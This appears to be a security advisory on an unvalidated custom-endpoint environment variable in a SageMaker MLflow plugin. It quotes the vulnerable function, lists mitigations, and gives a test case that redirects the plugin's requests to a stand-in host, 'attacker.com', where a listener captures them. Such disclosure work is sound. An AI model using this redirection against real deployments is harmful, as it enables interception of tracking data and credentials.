### Vulnerability List:

* Vulnerability Name: Unvalidated Custom Endpoint URL leading to Server-Side Request Forgery (SSRF)
* Description:
    1. The `get_tracking_server_url` function in `sagemaker_mlflow/mlflow_sagemaker_helpers.py` retrieves the value of the `SAGEMAKER_MLFLOW_CUSTOM_ENDPOINT` environment variable.
    2. If the `SAGEMAKER_MLFLOW_CUSTOM_ENDPOINT` environment variable is set, the function directly returns its value as the tracking server URL without any validation.
    3. This custom endpoint URL is then used in subsequent requests to the MLflow tracking server.
    4. An attacker who can control the `SAGEMAKER_MLFLOW_CUSTOM_ENDPOINT` environment variable can set it to a malicious URL.
    5. When the MLflow plugin makes requests to the tracking server, these requests will be redirected to the attacker-controlled URL, leading to a Server-Side Request Forgery (SSRF) vulnerability.
* Impact:
    An attacker can redirect requests originating from the server running the MLflow plugin to an arbitrary URL under their control. This can have several impacts:
    - **Data Exfiltration:** Sensitive data intended for the MLflow tracking server could be intercepted and exfiltrated to the attacker's server.
    - **Internal Network Scanning:** The attacker could use the server running the MLflow plugin to scan internal network resources that are not directly accessible from the outside.
    - **Denial of Service:** The attacker could redirect requests to a resource that causes the server to become overloaded or unresponsive.
    - **Credential Exposure:** If the MLflow plugin sends authentication credentials with the requests (though in this case it uses SigV4), these could be exposed if redirected to a non-HTTPS endpoint or a malicious server.
* Vulnerability Rank: Medium
* Currently Implemented Mitigations:
    - None. The code directly uses the custom endpoint URL without any validation if the `SAGEMAKER_MLFLOW_CUSTOM_ENDPOINT` environment variable is set.
* Missing Mitigations:
    - **URL Validation:** Implement validation for the `SAGEMAKER_MLFLOW_CUSTOM_ENDPOINT` environment variable. This should include:
        - **Protocol Check:** Ensure the URL uses HTTPS protocol to protect data in transit.
        - **Domain Whitelist/Blacklist:**  Ideally, restrict the allowed domains to a whitelist of trusted domains or implement a blacklist to prevent known malicious domains. If only connections to SageMaker are intended, consider enforcing that the domain must be within the `sagemaker.aws` or similar domain.
        - **Format Validation:** Validate the URL format to prevent unexpected or malicious URL structures.
    - **Documentation Warning:** Add a clear warning in the documentation about the security risks of using `SAGEMAKER_MLFLOW_CUSTOM_ENDPOINT` and advise users to only use it if absolutely necessary and with extreme caution.
* Preconditions:
    - The attacker must be able to control the environment variable `SAGEMAKER_MLFLOW_CUSTOM_ENDPOINT` where the MLflow plugin is running. This could be achieved through various means depending on the deployment environment, such as:
        - Compromising the server where the MLflow application is running.
        - Supply chain attack if the environment variables are set during build or deployment process.
        - In some misconfigured cloud environments, environment variables might be inadvertently exposed or modifiable.
* Source Code Analysis:
    - File: `/code/sagemaker_mlflow/mlflow_sagemaker_helpers.py`
    - Function: `get_tracking_server_url`
    ```python
    def get_tracking_server_url(tracking_server_arn: str) -> str:
        """Returns the url used by SageMaker MLflow

        Args:
           tracking_server_arn (str): Tracking Server Arn
        Returns:
            str: Tracking Server URL.
        """
        custom_endpoint = os.environ.get("SAGEMAKER_MLFLOW_CUSTOM_ENDPOINT", "")
        if custom_endpoint:
            logging.info(f"Using custom endpoint {custom_endpoint}")
            return custom_endpoint # Vulnerability: Directly returns custom endpoint without validation
        arn = validate_and_parse_arn(tracking_server_arn)
        dns_suffix = get_dns_suffix(arn.partition)
        endpoint = f"https://{arn.region}.experiments.sagemaker.{dns_suffix}"
        return endpoint
    ```
    - The code snippet shows that if `custom_endpoint` is not empty (i.e., `SAGEMAKER_MLFLOW_CUSTOM_ENDPOINT` is set), the function immediately returns the value of `custom_endpoint` without any validation.
    - The `validate_and_parse_arn` function is only called if `SAGEMAKER_MLFLOW_CUSTOM_ENDPOINT` is not set, meaning the validation is bypassed when a custom endpoint is provided.
* Security Test Case:
    1. **Setup Attacker Server:**  Set up a simple HTTP server (e.g., using `netcat` or Python's `http.server`) on `attacker.com` to listen on port 80 and log incoming requests. For example, using python: `python -m http.server 80`
    2. **Set Environment Variable:** In the environment where the MLflow plugin is running, set the environment variable `SAGEMAKER_MLFLOW_CUSTOM_ENDPOINT` to `http://attacker.com`.
    3. **Set MLFLOW_TRACKING_URI:** Set the `MLFLOW_TRACKING_URI` environment variable to a valid SageMaker ARN, for example: `arn:aws:sagemaker:us-west-2:000000000000:mlflow-tracking-server/test-server`. This is needed to satisfy other parts of the plugin initialization, but the custom endpoint should override it.
    4. **Execute MLflow Operation:** Run a simple MLflow operation that triggers a request to the tracking server. For example, execute the following Python code:
    ```python
    import mlflow
    mlflow.set_tracking_uri("arn") # "arn" will trigger the plugin
    mlflow.create_experiment("test_experiment_ssrf")
    ```
    5. **Observe SSRF:** Check the logs of the attacker's HTTP server (`attacker.com`). You should see an HTTP request logged, indicating that the MLflow plugin's request was redirected to `http://attacker.com` due to the `SAGEMAKER_MLFLOW_CUSTOM_ENDPOINT` setting. The request details in the logs will confirm the SSRF.